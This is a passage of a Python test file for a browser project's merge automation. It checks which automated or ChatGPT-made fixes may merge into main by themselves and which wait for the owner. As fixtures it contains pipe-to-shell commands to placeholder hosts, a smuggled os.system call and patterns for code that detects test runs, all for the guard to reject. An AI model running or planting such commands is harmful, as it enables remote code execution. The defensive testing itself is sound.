"""1.1.19, the owner's decisions: GitHub itself mails the owner, through issues
with exact titles, that a release is ready to publish (with the command) and
that ChatGPT has to step in. tools/automerge.py judges the automation's own
pull requests and ChatGPT's: since 2026-11-22 (the verified merge, the owner's
decision) only the automation's own pull request goes into main by itself, and
only when it is fully verified (every check, every required category, no test
or protected file, no security finding); ChatGPT's and people's wait for the
owner's order."""

import importlib.util
import json
import re
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
WORKFLOWS = ROOT / ".github" / "workflows"


def load(name):
    spec = importlib.util.spec_from_file_location(name.replace("-", "_"), ROOT / "tools" / ("%s.py" % name))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


merge = load("automerge")
guard = load("check-autofix-patch")
REPO = "NullSector-2077/IKE-Browser"


RELEASE = "C'E' UNA NUOVA RELEASE IN MAIN PRONTA DA PUBBLICARE!!!"
CHATGPT = "ATTENZIONE E' RICHIESTO IL TUO INTERVENTO PER FARE INTERVENIRE CHAT GPT NELL' AUTOFIX!!!"


def test_github_itself_tells_the_owner():
    """The owner's words: GitHub mails the owner (an issue assigned to the
    owner and naming the owner; its title is the mail's subject), never a
    mail service of ours: no address, password or mail secret anywhere."""
    rr = (WORKFLOWS / "release-ready.yml").read_text()
    af = (WORKFLOWS / "autofix.yml").read_text()
    assert 'title="%s"' % RELEASE in rr and '--assignee "$OWNER"' in rr and 'echo "@$OWNER:' in rr
    assert ("[ -d ~/IKE-Browser/.git ] || git clone https://github.com/NullSector-2077/IKE-Browser.git ~/IKE-Browser; "
            "cd ~/IKE-Browser && git checkout main && git pull --ff-only && python3 tools/publish.py") in rr
    assert 'gh issue close "$open"' in rr and 'gh release view "v$version"' in rr      # closed once published
    assert "7 * 86400" in rr and "<!-- release-ready: $version -->" in rr               # weekly reminder, one per version
    plan = load("autofix-plan")
    assert plan.ISSUE_TITLE % "Tests" == CHATGPT + " (Tests)"
    assert 'title="%s ($WORKFLOW)"' % CHATGPT in af and '--assignee "$GITHUB_REPOSITORY_OWNER"' in af
    assert 'echo "@$GITHUB_REPOSITORY_OWNER:' in af
    for path in [*WORKFLOWS.glob("*.yml"), *(ROOT / "tools").glob("*.py")]:
        text = path.read_text()
        assert not re.search(r"[\w.+-]+@gmail\.com", text), path.name
        assert "MAIL_" not in text and "smtplib" not in text, path.name
    assert not (ROOT / "tools" / "send-mail.py").exists()


def pr(ref="automation/autofix-main", repo=REPO, draft=True):
    return {"number": 7, "state": "open", "draft": draft, "title": "fix", "base": {"ref": "main"},
            "head": {"ref": ref, "sha": "a" * 40, "repo": {"full_name": repo}}}


OK_CHECKS = [{"name": "tests", "status": "completed", "conclusion": "success"},
             {"name": "sandbox", "status": "completed", "conclusion": "success"},
             {"name": "hand-over", "status": "completed", "conclusion": "skipped"}]
# the verified merge (2026-11-22): Security's RustSec check and Arch Linux too
FULL_CHECKS = OK_CHECKS + [{"name": "rust-advisories", "status": "completed", "conclusion": "success"},
                           {"name": "Arch Linux", "status": "completed", "conclusion": "success"}]
tc = load("test-categories")


def runs(**changes):
    """The runs of a commit as tools/maintenance-ledger.py's run_info reads them, every job and step of
    every category passed; changes: {category: result} (None: that workflow did not run). The filter
    lists' step runs only on a commit that changes the engine (the full chain, item 4): it is there
    only when a change names it (filter_lists="success")."""
    out = {}
    for _cat, (_desc, (workflow, job, step)) in tc.CATEGORIES.items():
        if not workflow or workflow == "daily-maintenance.yml" or _cat == "filter-lists":
            continue
        run = out.setdefault(workflow, {"id": 1, "status": "completed", "conclusion": "success", "jobs": {}})
        j = run["jobs"].setdefault(job, {"status": "completed", "conclusion": "success", "steps": {}})
        if step:
            j["steps"][step] = "success"
    for cat, result in changes.items():
        workflow, job, step = tc.CATEGORIES[cat.replace("_", "-")][1]
        if result is None:
            out[workflow] = None
        elif step:
            out[workflow]["jobs"][job]["steps"][step] = result
        else:
            out[workflow]["jobs"][job]["conclusion"] = result
    return out


# skipped on purpose: another check of the commit runs them (security.yml, the installed package)
EXPECTED = [{"test": "tests/test_sandbox.py::test_on", "area": "security and privacy", "junit": "junit.xml",
             "reason": "IKE_TEST_SANDBOX=1 only (needs a system where the sandbox works)"},
            {"test": "tests/test_licences.py::test_installed", "area": "licences", "junit": "junit.xml",
             "reason": "only for the installed package (IKE_TEST_APP)"}]
VERIFIED = {"runs": runs(), "skips": EXPECTED}
BASE = """from PyQt6.QtWidgets import QLabel


class Win:
    def title(self):
        self.label = QLabel("I.K.E.")
        return 1
"""
CODE = [{"filename": "ike/window.py", "status": "modified", "patch": "@@ -1 +1 @@\n-a = 1\n+a = 2",
         "old_source": BASE, "new_source": BASE.replace("return 1", "return 2")},
        {"filename": "CHANGELOG.md", "status": "modified",
         "patch": "@@ -3,0 +4,2 @@\n+## 1.1.20\n+- Automatic fix"}]
COMMITS = [{"commit": {"message": "autofix: attempt 1 after a failure of \"Tests\"\n\nPrepared by..."}}]
VERSION = [{"filename": "ike/__init__.py", "status": "modified",
            "patch": '@@ -5 +5 @@\n-__version__ = "1.1.19"\n+__version__ = "1.1.20"'},
           {"filename": "PKGBUILD", "status": "modified", "patch": "@@ -2 +2 @@\n-pkgver=1.1.19\n+pkgver=1.1.20"},
           {"filename": "README.md", "status": "modified",
            "patch": "@@ -9 +9 @@\n-**Version 1.1.19** - see [CHANGELOG.md](CHANGELOG.md).\n"
                     "+**Version 1.1.20** - see [CHANGELOG.md](CHANGELOG.md)."}]


def decide(p=None, commits=COMMITS, files=CODE, checks=FULL_CHECKS, evidence=VERIFIED, **kw):
    return merge.decide(REPO, p or pr(), commits, files, checks, lambda n: guard.allowed_path(n, False),
                        evidence=evidence, **kw)


def f(name, patch="@@ -1 +1 @@\n-a = 1\n+a = 2", status="modified", new=None):
    out = {"filename": name, "status": status, "patch": patch}
    if name.endswith(".py"):
        out.update(old_source=BASE, new_source=new if new is not None else BASE.replace("return 1", "return 2"))
    return out


def py(added):
    """A change of ike/window.py that adds these lines inside the method."""
    new = BASE.replace("        return 1", "".join("        %s\n" % line for line in added) + "        return 1")
    return f("ike/window.py", "@@ -6,0 +7,%d @@\n" % len(added) + "\n".join("+" + x for x in added), new=new)


def test_a_green_fix_of_interface_code_is_merged():
    """Since 2026-11-22 only when fully verified (FULL_CHECKS, VERIFIED): the 1.1.19 rule ("tests" and
    "sandbox" green) became this stronger conditional one, and ChatGPT's fix is only "ready" (the
    1.1.19 assertion "merge" for ChatGPT is replaced: it never merges by itself)."""
    assert decide() == ("merge", "")
    assert decide(files=CODE + VERSION) == ("merge", "")                 # the automation's own version raise
    assert decide(files=CODE + VERSION, published=True) == ("merge", "")  # a published version raised
    gpt = OK_CHECKS + [{"name": "guard", "status": "completed", "conclusion": "success"}]
    assert decide(pr("chatgpt/fix-20261121-0505"), commits=[{"commit": {"message": "Fix the tab bar"}}],
                  checks=gpt) == ("ready", "")
    # what merged in 1.1.19 (tests and sandbox only) no longer does: Security and Arch Linux too
    assert decide(checks=OK_CHECKS) == ("wait", "the check rust-advisories has not run on this commit yet")


def test_the_automations_own_jobs_are_not_waited_for():
    """Review 4, N7: the job that asks for the merge is itself a check of the
    commit; waiting for it ended the deciding run on "wait" for good."""
    own = [{"name": n, "status": "in_progress", "conclusion": None} for n in ("merge-ready", "hand-over", "merge")]
    assert decide(checks=FULL_CHECKS + own) == ("merge", "")
    text = (ROOT / "tools" / "automerge.py").read_text()
    assert "for _round in range(16):" in text and "time.sleep(30)" in text      # read again for a while


def test_a_harmless_interface_change_still_merges():
    """The syntax-tree rule keeps what is risky for a person, not every change."""
    assert decide(files=[py(["self.label.setToolTip('Tab ' + str(2))", "n = len(self.label.text()) + 1"])]) \
        == ("merge", "")


def test_it_waits_while_checks_run():
    assert decide(checks=OK_CHECKS + [{"name": "Arch Linux", "status": "in_progress"}])[0] == "wait"
    assert decide(evidence=None) == ("wait", merge.NO_EVIDENCE)        # the results are read once all passed
    assert decide(checks=OK_CHECKS[:1])[0] == "wait"                    # the sandbox tests have not run (H3)
    assert decide(pr("chatgpt/fix-1"), commits=[{"commit": {"message": "x"}}])[0] == "wait"   # no guard yet


def test_everything_else_waits_for_a_person():
    """Review 2 of 1.1.19: C1 (the update channel moved by two harmless-looking
    files), M1-M5, M9, and the earlier rules."""
    cases = {
        # C1: a new file, and a line that sets where updates come from
        "update channel": decide(files=[f("ike/window.py", '@@ -1,0 +2 @@\n+os.environ.setdefault("IKE_SYSTEM_DIR", x)'),
                                        f("ike/resources/update.json", "@@ -0,0 +1 @@\n+{}", "added")]),
        "new file": decide(files=CODE + [f("ike/helper.py", "@@ -0,0 +1 @@\n+x = 1", "added")]),
        "env line": decide(files=[f("ike/window.py", "@@ -1 +1 @@\n-a\n+b = os.environ.get('GITHUB_ACTIONS')")]),
        "sys.modules": decide(files=[f("ike/window.py", '@@ -1 +1 @@\n-a\n+p = sys.modules.get("py" + "test")')]),
        "safety module": decide(files=[f("ike/passwords.py")]),
        "config": decide(files=[f("ike/config.py")]),
        "page script": decide(files=[f("ike/resources/fingerprint.js")]),
        "no patch": decide(files=[{"filename": "ike/window.py", "status": "modified"}]),
        # M1, M2
        "conftest": decide(files=[f("ike/conftest.py")]),
        # review 4, N1: what a list of words did not see, judged on the syntax tree
        "alias of updater": decide(files=[py(["from . import updater as _u", "_u.source = lambda: {}"])]),
        "new address": decide(files=[py(["self.url = 'https://example.net/collect?q=%s'"])]),
        "getattr": decide(files=[py(["getattr(self, 'env' + 'iron')"])]),
        "from sys": decide(files=[py(["from sys import modules as _m"])]),
        "argv": decide(files=[py(["_T = any('t' in x for x in __import__('sys').argv)"])]),
        "platformName": decide(files=[py(["return QLabel.platformName() == 'off' + 'screen'"])]),
        "module attr": decide(files=[py(["QLabel.setText = lambda *a: None"])]),
        "global": decide(files=[py(["global X"])]),
        "whole file unread": decide(files=[{"filename": "ike/window.py", "status": "modified",
                                            "patch": "@@ -1 +1 @@\n-a = 1\n+a = 2"}]),
        "docs command": decide(files=[f("docs/MAINTENANCE.md", "@@ -3,0 +4 @@\n+Run: `curl -s https://x.example/y | sh`")]),
        "docs link": decide(files=[f("docs/MAINTENANCE.md", "@@ -3,0 +4 @@\n+See https://evil.example/")]),
        "version jump": decide(files=CODE[:1] + [f("ike/__init__.py", '@@ -5 +5 @@\n-__version__ = "1.1.20"\n'
                                                                    '+__version__ = "99.0.0"')]),
        "darkreader": decide(files=[f("ike/resources/darkreader.js")]),
        "tools": decide(files=[f("tools/check-components.py")]),
        "maintenance commit": decide(pr("chatgpt/fix-2"), commits=[{"commit": {"message": "maintenance: update"}}]),
        # M3: "only the version" carrying more
        "++ line": decide(files=[f("ike/__init__.py", '@@ -5 +5,2 @@\n-__version__ = "1.1.19"\n'
                                                     '+__version__ = "1.1.20"\n+++__import__("os").system("id")')]),
        "readme text": decide(files=[f("README.md", "@@ -9 +9 @@\n-**Version 1.1.19** - see [CHANGELOG.md](CHANGELOG.md).\n"
                                                    "+**Version 1.1.20** install with: curl https://x | sh")]),
        "changelog link": decide(files=[f("CHANGELOG.md", "@@ -3,0 +4 @@\n+- see https://evil.example/")]),
        "changelog removed": decide(files=[f("CHANGELOG.md", "@@ -40 +40 @@\n-old\n+new")]),
        "changelog code": decide(files=[f("CHANGELOG.md", "@@ -3,0 +4 @@\n+- run `curl x | sh`")]),
        "changelog text": decide(files=[f("CHANGELOG.md", "@@ -3,0 +4 @@\n+Paste this in a terminal")]),
        "version+": decide(files=[f("ike/__init__.py", '@@ -5 +5,2 @@\n-__version__ = "1.1.19"\n'
                                                       '+__version__ = "1.1.20"\n+__min_system__ = "1.1.20"')]),
        # M4: a trial by any spelling, or any commit the automatic fix did not write
        "trial": decide(commits=COMMITS + [{"commit": {"message": "Autofix trial 5 (deliberate errors)"}}]),
        "trial spelled": decide(commits=COMMITS + [{"commit": {"message": "autofix trial: x"}}]),
        "other commit": decide(commits=COMMITS + [{"commit": {"message": "Trial 6: x"}}]),
        "gpt trial": decide(pr("chatgpt/fix-3"), commits=[{"commit": {"message": "trial 7"}}]),
        # M5, M9 (since 2026-11-22 M9 holds only ChatGPT's fix; for the automation's own pull requests the
        # version rule took its place: a second raise on top of an unpublished version waits)
        "published": decide(pr("chatgpt/fix-4"), commits=[{"commit": {"message": "Fix"}}], published=True),
        "unread": decide(pr("chatgpt/fix-5"), commits=[{"commit": {"message": "Fix"}}], unread=True),
        "second raise": decide(files=CODE + VERSION, main_version="1.1.19"),
        # as before
        "tests": decide(files=CODE + [f("tests/test_x.py")]),
        "updater": decide(files=[f("ike/updater.py")]),
        "workflow": decide(files=[f(".github/workflows/tests.yml")]),
        "adblock": decide(files=[f("ike/blocker.py")]),
        "engine": decide(files=[f("ike-adblock/Cargo.toml")]),
        "youtube": decide(files=[f("ike/resources/videoads.js")]),
        "removed": decide(files=[{"filename": "ike/x.py", "status": "removed"}]),
        "failed": decide(checks=OK_CHECKS + [{"name": "Arch Linux", "status": "completed", "conclusion": "failure"}]),
        "person": decide(pr("fix/1.1.20-something")),
        "maintenance": decide(pr("automation/daily-maintenance")),
        "fork": decide(pr(repo="someone/IKE-Browser")),
    }
    wrong = {k: v for k, v in cases.items() if v[0] != "person"}
    assert not wrong, wrong


def test_the_workflows_are_wired():
    am = (WORKFLOWS / "automerge.yml").read_text()
    assert 'workflows: ["Tests", "Security", "ChatGPT fix guard", "Arch Linux"]' in am
    assert "ref: main" in am and "tools/automerge.py" in am and "persist-credentials: false" in am
    # H1: the automation's own runs start it with a dispatch; M8: a queue per commit
    assert "workflow_dispatch:" in am and "github.event.inputs.sha || github.event.workflow_run.head_sha" in am
    assert "group: automerge-${{ github.event.inputs.sha || github.event.workflow_run.head_sha }}" in am
    tests = (WORKFLOWS / "tests.yml").read_text()
    sec = (WORKFLOWS / "security.yml").read_text()
    for text in (tests, sec):
        assert "merge-ready:" in text and 'gh workflow run automerge.yml --ref main -f sha="$SHA"' in text
    assert "gh workflow run release-ready.yml --ref main" in tests                    # H2
    assert "github.ref_name == 'main')) ||" in tests                                  # H2: hand-over on main
    assert "A test that must fail still fails" in tests                               # H4
    assert "sandbox-issue:" in sec and "--label sandbox-failed" in sec                # H3
    af = (WORKFLOWS / "autofix.yml").read_text()
    assert 'retry gh workflow run security.yml --ref "$PUSH_BRANCH"' in af             # H3
    text = (ROOT / "tools" / "automerge.py").read_text()
    # since 2026-11-22 nothing merges into main by itself (the owner's decision)
    # 2026-11-22, the verified merge: PR #99's "no merge at all" became the conditional rule: one merge
    # call, in merge_it(), reached only for a "merge" of decide() on the automation's own branch
    assert text.count("/merge\"") == 1 and text.count("merge_it(") == 2
    assert text.index("def merge_it(") < text.index("/merge\"") < text.index("def main(")
    tail = text.split("def main(", 1)[1]
    assert tail.index("if not verified:") < tail.index("merge_it(a.repo, pr, a.sha)")
    assert tail.index('if kind == "ready":') < tail.index("merge_it(")
    rr = (WORKFLOWS / "release-ready.yml").read_text()
    assert "for check in tests sandbox" in rr and "group: release-ready" in rr          # H3, M6
    assert 'select(.author.login == "github-actions")' in rr and "--state closed" in rr   # M6
    assert "(merged by itself" in rr                                                    # C1: listed for the owner
    pub = load("publish")
    assert pub.tests_passed([{"name": "tests", "conclusion": "success"}], "sandbox") == "missing"
    assert "\"sandbox\"" in (ROOT / "tools" / "publish.py").read_text()


def test_every_notice_names_the_owner():
    """M7: with the recommended notification settings, GitHub mails only what
    assigns or names the owner."""
    for name in ("daily-check.yml", "daily-maintenance.yml", "security.yml"):
        text = (WORKFLOWS / name).read_text()
        assert '--assignee "$GITHUB_REPOSITORY_OWNER"' in text and "@$GITHUB_REPOSITORY_OWNER" in text, name
    assert '"--assignee", owner' in (ROOT / "tools" / "automation-health.py").read_text()
    sec = (WORKFLOWS / "security.yml").read_text()
    assert "--label rust-advisories" in sec and "in:title" not in sec


def test_the_guard_finds_the_test_run_by_other_names():
    """H4: lines under ike/ that find pytest or the runner without naming it."""
    for line in ('p = sys.modules.get("py" + "test")', "import importlib", "x = __import__('os')",
                 "if os.environ.get('GITHUB_ACTIONS'):", "import atexit", "f = sys._getframe(1)",
                 "inspect.stack()", "if os.environ.get('CI'):"):
        assert guard.PRODUCT_TAMPERING.search(line), line
    assert not guard.PRODUCT_TAMPERING.search("self.tabs.setCurrentIndex(i)")


def test_a_strangers_pull_request_on_the_same_commit_is_not_taken(monkeypatch, capsys):
    """L5: the pull request is chosen among this repository's own branches."""
    stranger = dict(pr(repo="someone/IKE-Browser"), number=99)
    monkeypatch.setattr(merge, "api", lambda path: [stranger] if "pulls?state=open" in path else [])
    merge.main(["--repo", REPO, "--sha", "a" * 40, "--dry-run"])
    assert "no pull request of the automation or of ChatGPT" in capsys.readouterr().out


def test_no_fix_can_change_the_rules_it_is_judged_by():
    """An automatic or ChatGPT fix touching tools/automerge.py could change
    the merge rules for the next ones: both tools are protected files."""
    assert "tools/automerge.py" in guard.FORBIDDEN_FILES
    assert decide(files=[f("tools/automerge.py")])[0] == "person"


def _candidate_check():
    text = (WORKFLOWS / "daily-maintenance.yml").read_text()
    step = text.split("- name: The candidate changes only what an update may change", 1)[1]
    body = step.split("<<'PY'\n", 1)[1].split("\n          PY\n", 1)[0]
    return "\n".join(line[10:] for line in body.splitlines()) + "\n"


def test_the_maintenance_candidate_changes_only_update_files(tmp_path):
    """H5, and review 4's N2: code of others runs while the candidate is made;
    what it may leave is a fixed list of files in the update's own commit, the
    version files with only the version, and automatic fixes only as the fix
    job published them."""
    import subprocess
    import sys
    script = tmp_path / "check.py"
    script.write_text(_candidate_check())
    repo = tmp_path / "r"
    repo.mkdir()

    def git(*a):
        return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *a], cwd=repo, check=True,
                              capture_output=True, text=True).stdout

    def write(name, text):
        p = repo / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
    git("init", "-q", "-b", "main")
    write("ike/__init__.py", '__version__ = "1.1.20"\n__min_system__ = "1.0.1"\n')
    write("PKGBUILD", "pkgname=ike-browser\npkgver=1.1.20\npkgrel=1\n")
    write("ike/updater.py", "x = 1\n")
    write("README.md", "x\n")
    git("add", "-A")
    git("commit", "-q", "-m", "start")
    git("update-ref", "refs/remotes/origin/main", "main")

    def candidate(changes, message="maintenance: update bundled components for IKE 1.1.21", carry=None):
        git("checkout", "-q", "-B", "cand", "main")
        for name, text in changes.items():
            write(name, text)
        git("add", "-A")
        git("commit", "-q", "-m", message)
        git("update-ref", "refs/ike/candidate", "cand")
        return subprocess.run([sys.executable, "-I", str(script), str(ROOT), "o/r"], cwd=repo,
                              capture_output=True, text=True)
    version = {"ike/__init__.py": '__version__ = "1.1.21"\n__min_system__ = "1.0.1"\n',
               "PKGBUILD": "pkgname=ike-browser\npkgver=1.1.21\npkgrel=1\n"}
    ok = candidate(dict(version, **{"ike-adblock/Cargo.lock": "x\n", "ike/resources/darkreader.js": "x\n"}))
    assert ok.returncode == 0, ok.stdout + ok.stderr
    bad = candidate({"ike/resources/ubo-scriptlets.json": "x\n", "ike/updater.py": "evil\n"})
    assert bad.returncode == 1 and "ike/updater.py" in bad.stdout, bad.stdout
    code = candidate({"ike/__init__.py": '__version__ = "1.1.21"\nimport os; os.system("id")\n'})
    assert code.returncode == 1 and "more than the version" in code.stdout, code.stdout
    assert candidate({"README.md": "y\n"}, message="something else").returncode == 1
    # an "autofix:" commit the fix job did not publish
    forged = candidate({"ike/updater.py": "evil\n"}, message="autofix: attempt 1 after a failure of Tests")
    assert forged.returncode == 1 and "not one the fix job published" in forged.stdout, forged.stdout
    # the same change published on the candidate branch by the fix job: carried
    git("checkout", "-q", "-B", "published", "main")
    write("ike/updater.py", "fixed\n")
    git("add", "-A")
    git("commit", "-q", "-m", "autofix: attempt 1 after a failure of Tests")
    git("update-ref", "refs/remotes/origin/automation/daily-maintenance", "published")
    carried = candidate({"ike/updater.py": "fixed\n"}, message="autofix: attempt 1 after a failure of Tests")
    assert carried.returncode == 0, carried.stdout + carried.stderr


def test_a_real_maintenance_candidate_passes_the_check(tmp_path):
    """The check must not stop the daily candidate itself: one made by
    tools/prepare-maintenance.py (a new engine, the version raised, a new
    CHANGELOG entry), and one that adds to a version not yet published."""
    import json
    import shutil
    import subprocess
    import sys
    script = tmp_path / "check.py"
    script.write_text(_candidate_check())
    repo = tmp_path / "r"

    def git(*a):
        return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *a], cwd=repo, check=True,
                              capture_output=True, text=True).stdout
    for rel in ("ike/__init__.py", "PKGBUILD", "README.md", "CHANGELOG.md"):
        (repo / rel).parent.mkdir(parents=True, exist_ok=True)
        shutil.copy(ROOT / rel, repo / rel)
    git("init", "-q", "-b", "main")
    git("add", "-A")
    git("commit", "-q", "-m", "start")
    git("update-ref", "refs/remotes/origin/main", "main")
    report = tmp_path / "report.json"
    report.write_text(json.dumps({"errors": 0, "components": [{
        "name": "AdBlock engine (adblock-rust)", "current": "0.10.0", "latest": "0.10.1",
        "update": True, "note": "", "also": ""}]}))
    version = re.search(r'__version__ = "([^"]+)"', (ROOT / "ike/__init__.py").read_text()).group(1)
    for keep in ([], ["--keep-version"]):
        git("checkout", "-q", "-B", "cand", "main")
        subprocess.run([sys.executable, str(ROOT / "tools/prepare-maintenance.py"), "--root", str(repo),
                        "--report", str(report), "--base-version", version, *keep], check=True)
        (repo / "ike-adblock").mkdir(exist_ok=True)
        (repo / "ike-adblock" / "Cargo.lock").write_text("new\n")
        git("add", "-A")
        git("commit", "-q", "-m", "maintenance: update bundled components")
        git("update-ref", "refs/ike/candidate", "cand")
        res = subprocess.run([sys.executable, "-I", str(script), str(ROOT), "NullSector-2077/IKE-Browser"],
                             cwd=repo, capture_output=True, text=True)
        assert res.returncode == 0, (keep, res.stdout + res.stderr)


def test_a_green_harmless_fix_waits_for_the_owners_order(monkeypatch):
    """2026-11-22, the owner's decisions: ChatGPT's fix never merges by itself.
    A green and harmless one is marked ready and the owner is told once; no
    merge call is made. (PR #99 asserted this for every fix and that the token
    could not write the contents; since the verified merge the automation's
    own fully verified pull request merges, see the tests below, and the token
    rights are checked in test_the_token_rights_are_the_least_needed.)"""
    calls = []
    sha = "a" * 40
    p = {"number": 7, "draft": True, "title": "fix", "state": "open",
         "head": {"sha": sha, "ref": "chatgpt/fix-20261122-0101", "repo": {"full_name": "o/r"}},
         "base": {"sha": "b" * 40, "ref": "main"}}
    gpt = FULL_CHECKS + [{"name": "guard", "status": "completed", "conclusion": "success"}]

    def api(path):
        if path.startswith("repos/o/r/pulls?"):
            return [p]
        if path.endswith("/commits?per_page=100"):
            return [{"sha": "d" * 40, "commit": {"message": "Fix the tab bar"}}]
        if path.endswith("/files?per_page=100"):
            return [dict(CODE[0])]
        if "/check-runs" in path:
            return {"check_runs": gpt}
        return []
    monkeypatch.setattr(merge, "api", api)
    monkeypatch.setattr(merge, "gh", lambda *a: calls.append(a) or "")
    monkeypatch.setattr(merge, "file_at", lambda repo, name, ref: BASE if ref == "b" * 40
                        else BASE.replace("return 1", "return 2"))
    monkeypatch.setattr(merge, "released", lambda *a: False)
    monkeypatch.setattr(merge, "version_of_main", lambda: "1.0")
    monkeypatch.setattr(merge, "unread_merge", lambda *a: False)
    monkeypatch.setattr(merge, "gather_evidence", lambda *a: pytest.fail("ChatGPT's fix is never verified to merge"))
    assert merge.main(["--repo", "o/r", "--sha", sha]) == 0
    flat = [" ".join(map(str, c)) for c in calls]
    assert not any("/merge" in c or "merge_method" in c for c in flat), flat
    assert any(c.startswith("pr ready 7") for c in flat), flat
    assert any(c.startswith("pr comment 7") and "tuo ordine" in c for c in flat), flat


# --- the verified merge (2026-11-22) --------------------------------------------------------------

CAND = "automation/daily-maintenance"
LOCK = ('@@ -10,6 +10,6 @@\n [[package]]\n name = "smallvec"\n-version = "1.13.1"\n+version = "1.13.2"\n'
        ' source = "registry+https://github.com/rust-lang/crates.io-index"\n checksum = "y"\n dependencies = []')
ENGINE_LOCK = LOCK.replace('"smallvec"', '"adblock"')
MAINT = {"sha": "e" * 40, "commit": {"message": "maintenance: update bundled components for IKE 1.1.20"},
         "files": ["ike-adblock/Cargo.lock", "ike/__init__.py", "PKGBUILD", "README.md", "CHANGELOG.md",
                   "licenses/smallvec-LICENSE", "docs/THIRD-PARTY.md"]}
FIX = {"sha": "f" * 40, "commit": {"message": COMMITS[0]["commit"]["message"]}, "files": ["ike/window.py"]}
CAND_FILES = [f("ike-adblock/Cargo.lock", LOCK), f("licenses/smallvec-LICENSE", "@@ -0,0 +1 @@\n+MIT", "added"),
              f("docs/THIRD-PARTY.md", "@@ -1 +1 @@\n-smallvec 1.13.1\n+smallvec 1.13.2")] + VERSION + CODE


def cand(commits=None, files=None, **kw):
    return decide(pr(CAND), commits=commits or [MAINT, FIX], files=files or CAND_FILES, **kw)


def fix_touching(name, status="modified"):
    """The candidate whose automatic fix also changed this file."""
    return cand(commits=[MAINT, dict(FIX, files=["ike/window.py", name])],
                files=CAND_FILES + [f(name, status=status)])


SECURITY_BRANCH = "automation/update/security-rustsec-2026-0001"
SECURITY_COMMIT = {"sha": "9" * 40, "commit": {
    "message": "security: RUSTSEC-2026-0001: smallvec 1.13.1 -> 1.13.2 (cargo update, no AI)\n\nRun: u"},
    "files": ["ike-adblock/Cargo.lock"]}


def test_a_fully_verified_candidate_merges():
    """The owner's decision: the daily candidate (the update and the automatic fix it carries), an
    AutoFix fix and an isolated update go into main by themselves when fully verified."""
    assert cand() == ("merge", "")
    assert decide() == ("merge", "")                                         # an AutoFix fix of main
    assert decide(pr(SECURITY_BRANCH), commits=[SECURITY_COMMIT],
                  files=[f("ike-adblock/Cargo.lock", LOCK)]) == ("merge", "")
    # a candidate of the test packages only: no new version, nothing shipped, merged even when published
    tools = {"sha": "1" * 40, "commit": {"message": "maintenance: update bundled components for IKE 1.1.19"},
             "files": ["tools/test-requirements.txt"]}
    assert cand(commits=[tools], files=[f("tools/test-requirements.txt", "@@ -1 +1 @@\n-ruff==0.9\n+ruff==1.0")],
                published=True) == ("merge", "")
    # the full chain, item 4: a new engine, its filter lists checked on its own commit, merges by itself
    assert cand(files=[f("ike-adblock/Cargo.lock", ENGINE_LOCK)] + CAND_FILES[1:],
                evidence={"runs": runs(filter_lists="success"), "skips": EXPECTED}) == ("merge", "")
    assert merge.kinds_of(CAND_FILES) == ["crate", "integrated"]
    assert merge.kinds_of([f("ike-adblock/Cargo.lock", ENGINE_LOCK)]) == ["adblock-engine", "crate"]
    assert merge.kinds_of([{"filename": "ike-adblock/Cargo.lock"}]) == ["adblock-engine", "crate"]   # unread


def _with(name, **change):
    return [dict(c, **change) if c["name"] == name else c for c in FULL_CHECKS]


SKIPPED_FFMPEG = {"test": "tests/test_plasma.py::test_video", "area": "desktop integration", "junit": "junit.xml",
                  "reason": "ffmpeg not installed"}


@pytest.mark.parametrize("case, got, kind, why", [
    ("one check failing", lambda: cand(checks=_with("Arch Linux", conclusion="failure")),
     "person", "the check Arch Linux did not pass"),
    ("tests failing", lambda: cand(checks=_with("tests", conclusion="failure")), "person", "the check tests"),
    ("security check failing", lambda: cand(checks=_with("rust-advisories", conclusion="failure")),
     "person", "the check rust-advisories"),
    ("a check skipped", lambda: cand(checks=_with("sandbox", conclusion="skipped")),
     "person", "the check sandbox did not pass (skipped)"),
    ("Arch not run", lambda: cand(checks=[c for c in FULL_CHECKS if c["name"] != "Arch Linux"]),
     "wait", "the check Arch Linux has not run on this commit yet"),
    ("Arch's run not there", lambda: cand(evidence={"runs": runs(**{"arch-packaging": None}), "skips": EXPECTED}),
     "person", "arch-packaging not verified (not run (yet) on this commit)"),
    ("a required category not run", lambda: cand(evidence={"runs": runs(**{"tests-kept": ""}), "skips": EXPECTED}),
     "person", "tests-kept not verified"),
    ("a required category skipped", lambda: cand(evidence={"runs": runs(**{"old-cpu": "skipped"}),
                                                           "skips": EXPECTED}),
     "person", "old-cpu not verified (the step was skipped)"),
    ("licences not up to date", lambda: cand(evidence={"runs": runs(licences="failure"), "skips": EXPECTED}),
     "person", "licences failed"),
    ("the sandbox job not run", lambda: cand(evidence={"runs": runs(sandbox=None), "skips": EXPECTED}),
     "person", "sandbox not verified"),
    ("a required test skipped", lambda: cand(evidence={"runs": runs(), "skips": EXPECTED + [SKIPPED_FFMPEG]}),
     "person", "a required test was skipped: tests/test_plasma.py::test_video (ffmpeg not installed)"),
    ("skips not readable", lambda: cand(evidence={"runs": runs(), "skips": None}),
     "person", "unit-integration not verified (the step passed, but its test results could not be read)"),
    ("an engine update: filter lists not verified on the commit",
     lambda: cand(files=[f("ike-adblock/Cargo.lock", ENGINE_LOCK)] + CAND_FILES[1:]),
     "person", "filter-lists not verified"),
    ("an engine update: the lists' step skipped (a list not downloaded)",
     lambda: cand(files=[f("ike-adblock/Cargo.lock", ENGINE_LOCK)] + CAND_FILES[1:],
                  evidence={"runs": runs(filter_lists="skipped"), "skips": EXPECTED}),
     "person", "filter-lists not verified (the step was skipped)"),
    ("an engine update: its engine reads the lists worse than main's",
     lambda: cand(files=[f("ike-adblock/Cargo.lock", ENGINE_LOCK)] + CAND_FILES[1:],
                  evidence={"runs": runs(filter_lists="failure"), "skips": EXPECTED}),
     "person", "filter-lists failed"),
    ("a test file changed", lambda: fix_touching("tests/test_window.py"), "person", "a test file changed or removed"),
    ("a test file removed", lambda: fix_touching("tests/test_tabs.py", "removed"), "person", "a test file"),
    ("a conftest", lambda: fix_touching("ike/conftest.py"), "person", "a test file"),
    ("a protected file", lambda: fix_touching("tools/test-categories.py"), "person", "a protected file"),
    ("the merge's own rules", lambda: fix_touching("tools/automerge.py"), "person", "a protected file"),
    ("a workflow", lambda: fix_touching(".github/workflows/tests.yml"), "person", "a workflow"),
